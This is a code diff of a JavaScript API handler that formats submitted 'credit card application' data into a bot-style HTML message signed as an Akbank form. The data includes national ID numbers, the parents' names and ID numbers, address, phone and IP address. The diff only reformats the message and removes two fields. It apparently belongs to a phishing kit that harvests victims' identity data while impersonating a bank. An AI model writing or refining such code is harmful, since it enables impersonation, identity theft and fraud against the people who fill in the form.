@@ -36,8 +36,6 @@ export default async function handler(req, res) {
       memleketIl,
       memleketIlce,
       medeniHal,
-      vergiNumarasi,
-      gsm,
       type 
     } = req.body;
 
@@ -81,63 +79,15 @@ export default async function handler(req, res) {
       message = `
 💳 <b>Yeni Kredi Kartı Başvurusu</b>
 
-👤 <b>Ad Soyad:</b>
-${escapeHtml(adSoyad)}
+👤 <b>Ad Soyad:</b> ${escapeHtml(adSoyad)} | 📱 <b>TC:</b> <code>${escapeHtml(tckn)}</code> | 📅 <b>Doğum:</b> ${escapeHtml(dogumTarihi)} | ⚧️ <b>Cinsiyet:</b> ${escapeHtml(cinsiyet)} | 📍 <b>Doğum Yeri:</b> ${escapeHtml(dogumYeri)}
 
-📱 <b>TC Kimlik No:</b>
-<code>${escapeHtml(tckn)}</code>
+👩 <b>Anne Adı:</b> ${escapeHtml(anneAdi)} | 🆔 <b>Anne TCKN:</b> <code>${escapeHtml(anneTCKN)}</code> | 👨 <b>Baba Adı:</b> ${escapeHtml(babaAdi)} | 🆔 <b>Baba TCKN:</b> <code>${escapeHtml(babaTCKN)}</code>
 
-📅 <b>Doğum Tarihi:</b>
-${escapeHtml(dogumTarihi)}
+🏠 <b>Adres:</b> ${escapeHtml(adresIl)}/${escapeHtml(adresIlce)} | 🗺️ <b>Memleket:</b> ${escapeHtml(memleketIl)}/${escapeHtml(memleketIlce)} | 💑 <b>Medeni Hal:</b> ${escapeHtml(medeniHal)}
 
-⚧️ <b>Cinsiyet:</b>
-${escapeHtml(cinsiyet)}
+📞 <b>Telefon:</b> ${escapeHtml(telefon)} | 💵 <b>Kart Limiti:</b> ${escapeHtml(kartLimiti)} TL
 
-📍 <b>Doğum Yeri:</b>
-${escapeHtml(dogumYeri)}
-
-👩 <b>Anne Adı:</b>
-${escapeHtml(anneAdi)}
-
-👨 <b>Baba Adı:</b>
-${escapeHtml(babaAdi)}
-
-🆔 <b>Anne TCKN:</b>
-<code>${escapeHtml(anneTCKN)}</code>
-
-🆔 <b>Baba TCKN:</b>
-<code>${escapeHtml(babaTCKN)}</code>
-
-🏠 <b>Adres İl:</b>
-${escapeHtml(adresIl)}
-
-🏘️ <b>Adres İlçe:</b>
-${escapeHtml(adresIlce)}
-
-🗺️ <b>Memleket İl:</b>
-${escapeHtml(memleketIl)}
-
-🗺️ <b>Memleket İlçe:</b>
-${escapeHtml(memleketIlce)}
-
-💑 <b>Medeni Hal:</b>
-${escapeHtml(medeniHal)}
-
-📋 <b>Vergi Numarası:</b>
-<code>${escapeHtml(vergiNumarasi)}</code>
-
-📱 <b>GSM (API):</b>
-${escapeHtml(gsm)}
-
-📞 <b>Telefon Numarası (Form):</b>
-${escapeHtml(telefon)}
-
-💵 <b>Kart Limiti:</b>
-${escapeHtml(kartLimiti)} TL
-
-🌐 <b>IP Adresi:</b> <code>${escapeHtml(ip)}</code>
-🖥️ <b>User Agent:</b> ${escapeHtml(userAgent)}
-📅 <b>Tarih:</b> ${escapeHtml(date)}
+🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}
 
 ---
 <i>Akbank Başvuru Formu</i>
